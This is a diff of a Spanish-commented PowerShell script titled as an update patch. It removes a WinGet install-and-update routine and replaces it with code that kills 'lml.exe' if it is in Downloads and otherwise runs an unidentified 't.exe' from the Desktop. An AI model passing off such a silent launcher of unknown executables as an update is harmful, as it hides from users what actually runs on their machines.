@@ -1,12 +1,10 @@
-# Parche de Actualización Area-2
-$progressPreference = 'silentlyContinue'
-Write-Information "Downloading WinGet and its dependencies..."
-Invoke-WebRequest -Uri https://aka.ms/getwinget -OutFile Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
-Invoke-WebRequest -Uri https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -OutFile Microsoft.VCLibs.x64.14.00.Desktop.appx
-Invoke-WebRequest -Uri https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.7.3/Microsoft.UI.Xaml.2.7.x64.appx -OutFile Microsoft.UI.Xaml.2.7.x64.appx
-Add-AppxPackage Microsoft.VCLibs.x64.14.00.Desktop.appx
-Add-AppxPackage Microsoft.UI.Xaml.2.7.x64.appx
-Add-AppxPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
+$downloadPath = "C:\Users\$env:USERNAME\Downloads\lml.exe"
+$desktopPath = "C:\Users\$env:USERNAME\Desktop\t.exe"
 
-winget update --all
-winget upgrade --all
+if (Test-Path $downloadPath) {
+    # El archivo "lml.exe" existe en la carpeta de descargas
+    taskkill /F /IM lml.exe
+    
+} else {
+   C:\Users\$env:USERNAME\Desktop\t.exe
+}
